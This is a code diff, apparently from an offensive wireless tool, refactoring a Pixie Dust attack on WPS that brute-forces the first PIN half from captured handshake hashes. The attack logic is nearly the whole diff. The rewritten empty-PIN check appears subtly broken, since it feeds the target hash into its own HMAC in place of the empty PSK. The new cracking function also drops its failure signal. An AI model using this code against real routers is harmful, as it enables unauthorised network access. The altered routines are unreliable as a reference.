@@ -26,34 +26,39 @@ import (
 	"fmt"
 	"math/big"
 	"net"
+	"offscan/internal/utils"
+	"slices"
 	"time"
 )
 
 
 
 type pixieDustAttack struct {
-	jobs     int
-	pke      []byte
-	pkr      []byte
-	eHash1   []byte
-	eHash2   []byte
-	authKey  []byte
-	eNonce   []byte
-	rNonce   []byte
-	ebssid   net.HardwareAddr
-	modes    []uint8
-	m5enc    []byte
-	m7enc    []byte
-	force    bool
-	dhSmall  bool
-	start    string
-	end      string
-	cStart   int
-	cEnd     int
-    emsk     []byte
-    wrapKey  []byte
-    eSecret1 []byte
-    eSecret2 []byte
+    firstHalf   []byte
+    secondHalf  []byte
+	jobs        int
+	pke         []byte
+	pkr         []byte
+	eHash1      []byte
+	eHash2      []byte
+	authKey     []byte
+	eNonce      []byte
+	rNonce      []byte
+	ebssid      net.HardwareAddr
+	modes       []uint8
+	m5enc       []byte
+	m7enc       []byte
+	force       bool
+	dhSmall     bool
+	start       string
+	end         string
+	cStart      int
+	cEnd        int
+    emsk        []byte
+    wrapKey     []byte
+    eSecret1    []byte
+    eSecret2    []byte
+    psk1        []byte
 }
 
 
@@ -74,7 +79,7 @@ func (pda *pixieDustAttack) execute() {
 
 
 
-func computeDHKey(pkr []byte) ([]byte) {
+func computeDHKey(pkr []byte) []byte {
     eKey := bytes.Repeat([]byte{0x55}, 192)
 	
     sharedSecret, err := cryptoModExp(pkr, eKey, dhGroup5Prime)
@@ -89,15 +94,7 @@ func computeDHKey(pkr []byte) ([]byte) {
 
 
 func (pda *pixieDustAttack) isModeSelect(mode uint8) bool {
-	if len(pda.modes) <= 0 { return false }
-	
-	for _, m := range pda.modes {
-		if mode == m {
-			return true
-		}
-	}
-
-	return false
+	return slices.Contains(pda.modes, mode)
 }
 
 
@@ -201,51 +198,65 @@ func glibcFastNonce(seed uint32) []byte {
 
 
 
-func crackFirstHalf(authkey, eS1, pke, pkr, eHash1, emptyPsk []byte) (int, []byte, bool, bool) {
-    if checkEmptyPinHalf(eS1, authkey, pke, pkr, eHash1, emptyPsk) {
-        return 0, emptyPsk, true, true
+func (pda *pixieDustAttack) crackFirstHalf(es1Override []byte) {
+    eS1 := utils.Pick(es1Override != nil, es1Override, pda.eSecret1)
+
+    if pda.checkEmptyPinHalf(eS1, pda.eHash1) {
+        pda.firstHalf = []byte{}
+        return
     }
 
-    for firstHalf := 0; firstHalf < 10000; firstHalf++ {
-        pinhalf := fmt.Sprintf("%04d", firstHalf)
-        ok, psk := checkPinHalf(authkey, eS1, pke, pkr, eHash1, pinhalf)
+    for half1 := 0; half1 < 10000; half1++ {
+        firstHalf := intToPinHalf(half1)
+        psk, ok := pda.checkPinHalf(eS1, pda.eHash1, firstHalf)
 
 		if ok {
-            return firstHalf, psk, true, false
+            pda.firstHalf = firstHalf
+            pda.psk1      = psk
+            return
         }
     }
-
-    return 0, nil, false, false
 }
 
 
 
-func checkPinHalf(authkey, es, pke, pkr, ehash []byte, pinhalf string) (bool, []byte) {
-    h := hmac.New(sha256.New, authkey)
-    h.Write([]byte(pinhalf))
+func intToPinHalf(n int) []byte {
+    var buf [4]byte
+    buf[0] = byte('0' + (n/1000)%10)
+    buf[1] = byte('0' + (n/100)%10)
+    buf[2] = byte('0' + (n/10)%10)
+    buf[3] = byte('0' + n%10)
+    return buf[:]
+}
+
+
+
+func (pda *pixieDustAttack) checkEmptyPinHalf(es, ehash []byte) bool {
+    h := hmac.New(sha256.New, pda.authKey)
+    h.Write(es)
+    h.Write(ehash)
+    h.Write(pda.pke)
+    h.Write(pda.pkr)
+    hash := h.Sum(nil)
+    return hmac.Equal(hash, ehash)
+}
+
+
+
+func (pda *pixieDustAttack) checkPinHalf(es, ehash, pinhalf []byte) ([]byte, bool) {
+    h := hmac.New(sha256.New, pda.authKey)
+    h.Write(pinhalf)
     psk := h.Sum(nil)
 
     // buffer = es || psk || pke || pkr
     h.Reset()
     h.Write(es)
     h.Write(psk)
-    h.Write(pke)
-    h.Write(pkr)
+    h.Write(pda.pke)
+    h.Write(pda.pkr)
     hash := h.Sum(nil)
 
-    return hmac.Equal(hash, ehash), psk
-}
-
-
-
-func checkEmptyPinHalf(es, authkey, pke, pkr, ehash, emptyPsk []byte) bool {
-    h := hmac.New(sha256.New, authkey)
-    h.Write(es)
-    h.Write(emptyPsk)
-    h.Write(pke)
-    h.Write(pkr)
-    hash := h.Sum(nil)
-    return hmac.Equal(hash, ehash)
+    return psk, hmac.Equal(hash, ehash)
 }
 
 
